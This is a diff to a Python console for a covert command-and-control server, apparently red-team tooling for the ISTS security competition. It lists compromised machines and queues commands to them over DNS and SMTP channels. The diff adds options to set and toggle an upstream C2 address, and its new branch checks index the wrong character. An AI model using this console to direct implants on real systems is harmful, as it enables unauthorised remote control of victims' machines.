@@ -24,11 +24,13 @@ def main():
     thread.start()
     print("SMTP server on TCP 25 started")
     print("Commands:")
-    print("         l - List all known machines")
-    print("         dl - List known machines from DNS")
+    print("         l    - List all known machines")
+    print("         dl   - List known machines from DNS")
     print("         dc # - Set command for machine # over DNS")
-    print("         ml - List known machines from mail")
+    print("         ml   - List known machines from mail")
     print("         mc # - Set command for machine # over mail")
+    print("         c2i  - Set the IP or FQDN of the ISTS C2")
+    print("         c2d  - Enable running commands from ISTS C2 (in case of compromise)")
     try:
         while 1:
             cmd = input("mailman# ")
@@ -55,6 +57,14 @@ def main():
                     target = int(cmd.split(" ")[1])
                     targetCmd = input("Target$ ")
                     mail.waitingCommands[mail.knownHosts[target]] = targetCmd
+                else:
+                    print("Unknown command.")
+            elif cmd[0] == "c":
+                if cmd[2] == "i":
+                    istsIP = input("ISTS C2 Address (include trailing .): ")
+                    resolver.setC2(istsIP)
+                if cmd[2] == 'd':
+                    resolver.disableC2()
                 else:
                     print("Unknown command.")
             else:
